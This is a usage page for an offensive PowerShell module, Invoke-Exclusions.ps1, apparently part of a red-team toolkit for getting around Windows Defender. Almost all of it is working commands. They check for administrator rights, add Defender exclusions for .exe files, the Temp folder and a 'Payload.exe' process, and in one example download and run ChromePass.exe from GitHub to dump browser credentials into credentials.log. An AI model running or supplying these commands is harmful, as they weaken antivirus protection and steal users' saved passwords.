## Module Name
   <b><i>Invoke-Exclusions.ps1</i></b>

|Cmdlet name|Description|Privileges|Notes|
|---|---|---|---|
|Invoke-Exclusions|Add exclusions (Set-MpPreference) + Download\Execute url cmdlet|Administrator|[Screenshot](https://null)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name WinDefend)

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name ConfigDefender).ExportedCommands|findstr /C:"Set-MpPreference")
```

```powershell
#Get full module information
Get-help .\Invoke-Exclusions.ps1 -Force

#Get Exclusions List
.\Invoke-Exclusions.ps1 -action "query"


#Set-MpPreference -ExclusionExtension "exe" -Force
.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionExtension" -Exclude "exe"

#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionPath" -Exclude "$Env:TMP"

#Set-MpPreference -ExclusionProcess "C:\Users\pedro\AppData\Local\Temp\Payload.exe" -Force
.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"


## Add exclusion + download URI PE + execute PE
#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"


#Remove-MpPreference -ExclusionProcess "$Env:TMP\Payload.exe" Force
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "$Env:TMP\Payload.exe"

```
